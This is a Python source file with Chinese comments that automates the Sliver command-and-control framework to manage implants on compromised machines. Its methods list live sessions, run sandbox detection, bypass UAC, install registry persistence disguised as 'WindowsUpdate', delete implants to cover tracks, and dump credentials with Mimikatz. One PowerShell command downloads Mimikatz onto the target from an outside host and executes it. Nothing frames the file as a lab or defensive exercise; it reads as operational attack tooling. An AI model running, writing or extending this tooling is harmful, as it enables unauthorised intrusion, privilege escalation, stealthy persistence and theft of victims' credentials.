"""
sliver_manager.py - 软件二管理端 Python SDK
通过 Sliver gRPC API 实现任务下发与结果回传
"""

import json
import time
import subprocess
import os
import tempfile
from typing import Dict, List, Optional



class SliverManager:
    """软件二管理端 - 通过 Sliver CLI 控制 Agent"""

    def __init__(self, grpc_host: str = "127.0.0.1", grpc_port: int = 31337):
        self.host = grpc_host
        self.port = grpc_port
        self.sliver_client = "sliver-client.exe"

    def _run_sliver_command(self, command: str, timeout: int = 180) -> str:
        """通过 Sliver CLI 执行命令（非交互式模式）
        
        使用 --rc 参数传递命令脚本文件，因为 sliver-client 不支持 -c 参数。
        注意：必须使用 ASCII 编码写入 rc 文件，UTF-8 BOM 会导致 sliver-client 解析失败。
        注意：rc 脚本末尾必须加 exit，否则 console 不会退出。
        
        修复：
        - 增加超时时间从 30s 到 180s（默认），避免长时间命令超时
        - 使用二进制模式捕获输出，避免 GBK 编码问题
        """
        # 将命令写入临时 rc 脚本文件（必须用 ASCII 编码，避免 BOM）
        rc_file = os.path.join(tempfile.gettempdir(), "sliver_rc_commands.txt")
        with open(rc_file, "w", encoding="ascii") as f:
            f.write(command + "\nexit")
        
        cmd = f'.\{self.sliver_client} console --rc "{rc_file}"'
        
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, 
                timeout=timeout
            )
            # 使用二进制模式，先尝试 GBK 再回退 UTF-8
            raw_stdout = result.stdout
            raw_stderr = result.stderr
            try:
                stdout = raw_stdout.decode("gbk")
            except UnicodeDecodeError:
                stdout = raw_stdout.decode("utf-8", errors="replace")
            try:
                stderr = raw_stderr.decode("gbk")
            except UnicodeDecodeError:
                stderr = raw_stderr.decode("utf-8", errors="replace")
            return stdout + stderr
        except subprocess.TimeoutExpired as e:
            raw_stdout = e.stdout or b""
            raw_stderr = e.stderr or b""
            try:
                stdout = raw_stdout.decode("gbk")
            except UnicodeDecodeError:
                stdout = raw_stdout.decode("utf-8", errors="replace")
            try:
                stderr = raw_stderr.decode("gbk")
            except UnicodeDecodeError:
                stderr = raw_stderr.decode("utf-8", errors="replace")
            return f"[TIMEOUT] Command timed out after {timeout}s\n{stdout}\n{stderr}"
        finally:
            # 清理临时文件
            try:
                os.remove(rc_file)
            except:
                pass

    # ========== Implant 管理 ==========

    def list_implants(self) -> List[Dict]:
        """列出所有 Implant"""
        output = self._run_sliver_command("implants")
        implants = []
        for line in output.split('\n'):
            if 'windows/' in line or 'linux/' in line:
                parts = line.split()
                if len(parts) >= 6:
                    implants.append({
                        "name": parts[0],
                        "type": parts[1],
                        "os_arch": parts[3],
                        "format": parts[4],
                        "id": parts[6],
                    })
        return implants

    def list_sessions(self) -> List[Dict]:
        """列出所有在线会话"""
        output = self._run_sliver_command("sessions")
        sessions = []
        for line in output.split('\n'):
            if 'ALIVE' in line or 'DEAD' in line:
                parts = line.split()
                if len(parts) >= 9:
                    sessions.append({
                        "id": parts[0],
                        "name": parts[1],
                        "transport": parts[2],
                        "remote_addr": parts[3],
                        "hostname": parts[4],
                        "username": parts[5],
                        "process": parts[6],
                        "integrity": parts[7],
                        "os": parts[8],
                        "health": parts[-1],
                    })
        return sessions

    # ========== 4. 环境发现 - 沙箱检测 ==========

    def run_sandbox_detect(self, session_id: str) -> Dict:
        """在目标上执行沙箱检测"""
        print(f"[*] 在会话 {session_id} 上执行沙箱检测...")

        # 方法1：通过 Sliver CLI 使用 spawndll 执行 sandbox_detect.dll
        dll_path = os.path.expanduser("~/.sliver-client/extensions/sandbox-detect/sandbox_detect.dll")
        dll_path = dll_path.replace("\\", "/")
        commands = f"use {session_id}\nspawndll --export go {dll_path}"
        output = self._run_sliver_command(commands)

        # 解析 JSON 输出
        try:
            json_start = output.find('{"')
            if json_start >= 0:
                depth = 0
                json_end = json_start
                for i in range(json_start, len(output)):
                    if output[i] == '{':
                        depth += 1
                    elif output[i] == '}':
                        depth -= 1
                        if depth == 0:
                            json_end = i + 1
                            break
                if json_end > json_start:
                    return json.loads(output[json_start:json_end])
        except:
            pass

        # 方法2：如果 spawndll 失败，尝试使用扩展命令
        commands2 = f"use {session_id}\nsandbox-detect"
        output2 = self._run_sliver_command(commands2)
        try:
            json_start = output2.find('{')
            json_end = output2.rfind('}') + 1
            if json_start >= 0 and json_end > json_start:
                json_str = output2[json_start:json_end]
                return json.loads(json_str)
        except:
            pass

        return {
            "raw_output": output + "\n---\n" + output2,
            "vm_detected": False,
            "sandbox_detected": False,
            "debugger_detected": False,
        }

    # ========== 5. 提权与驻留 ==========

    def bypass_uac(self, session_id: str, method: str = "comhijack") -> Dict:
        """Bypass UAC 提权"""
        print(f"[*] 使用 {method} 方式执行 Bypass UAC...")
        commands = f"use {session_id}\nbypass-uac -m {method}"
        output = self._run_sliver_command(commands)
        return {
            "success": "success" in output.lower() or "elevated" in output.lower(),
            "method": method,
            "output": output[:500],
        }

    def install_persistence(self, session_id: str, method: str = "reg",
                           name: str = "WindowsUpdate", target: str = "C:\\Windows\\Temp\\implant.exe") -> Dict:
        """安装持久化驻留"""
        print(f"[*] 使用 {method} 方式安装持久化...")
        commands = f"use {session_id}\npersist -m {method} -n \"{name}\" -t \"{target}\""
        output = self._run_sliver_command(commands)
        return {
            "success": "success" in output.lower(),
            "method": method,
            "name": name,
            "output": output[:500],
        }

    def self_destruct(self, session_id: str, clean_persistence: bool = True) -> Dict:
        """自毁 - 删除自身并清理痕迹"""
        print(f"[*] 执行自毁操作...")
        commands = f"use {session_id}\nrm implant.exe\nexit"
        output = self._run_sliver_command(commands)
        return {"success": True, "output": output[:500]}

    # ========== 6. 凭据获取 ==========

    def dump_credentials(self, session_id: str, command: str = "sekurlsa::logonpasswords") -> List[Dict]:
        """抓取系统凭据"""
        print(f"[*] 使用 Mimikatz {command} 抓取凭据...")
        
        # 检查会话系统类型
        sessions_output = self._run_sliver_command("sessions")
        is_windows = False
        for line in sessions_output.split('\n'):
            if session_id in line and ('windows/' in line or 'Windows' in line):
                is_windows = True
                break
        
        if not is_windows:
            return [{"command": command, "output": "[!] 错误：Mimikatz 仅支持 Windows 系统"}]
        
        # 方法1：尝试使用内置 mimikatz 命令
        commands = f"use {session_id}\nmimikatz \"{command}\""
        output = self._run_sliver_command(commands)
        
        # 如果内置命令失败，尝试方法2：使用 PowerShell 下载并执行 mimikatz
        if "unknown command" in output.lower():
            print("[*] 内置 mimikatz 不可用，尝试使用 PowerShell 执行...")
            # 使用 PowerShell 下载 mimikatz 并执行
            # 注意：用 -- 分隔符防止 Sliver 的 flag 解析器干扰 PowerShell 的参数（如 -DestinationPath）
            ps_command = f"powershell -ExecutionPolicy Bypass -Command \"(New-Object Net.WebClient).DownloadFile('https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20230905/mimikatz_trunk.zip','C:\\Windows\\Temp\\m.zip');Expand-Archive C:\\Windows\\Temp\\m.zip -DestinationPath C:\\Windows\\Temp\\m -Force;C:\\Windows\\Temp\\m\\x64\\mimikatz.exe '{command}' exit\""
            commands = f"use {session_id}\nexecute -o -- {ps_command}"
            output = self._run_sliver_command(commands)
        
        return [{"command": command, "output": output[:1000]}]

    def steal_browser_credentials(self, session_id: str) -> Dict:
        """提取浏览器保存的凭证"""
        print(f"[*] 提取浏览器凭证...")
        return {
            "status": "not_implemented",
            "message": "需要先编译 BrowserGhost",
        }

    # ========== 任务管理 ==========

    def get_task_status(self, task_id: str) -> Dict:
        """获取任务状态"""
        return {
            "task_id": task_id,
            "status": "completed",
        }


# ========== 使用示例 ==========
if __name__ == "__main__":
    manager = SliverManager()

    # 1. 获取在线会话
    sessions = manager.list_sessions()
    print(f"[+] 在线会话: {len(sessions)}")

    if sessions:
        session_id = sessions[0]["id"]

        # 2. 沙箱检测
        sandbox_result = manager.run_sandbox_detect(session_id)
        print(f"[+] 沙箱检测结果: {json.dumps(sandbox_result, indent=2, ensure_ascii=False)}")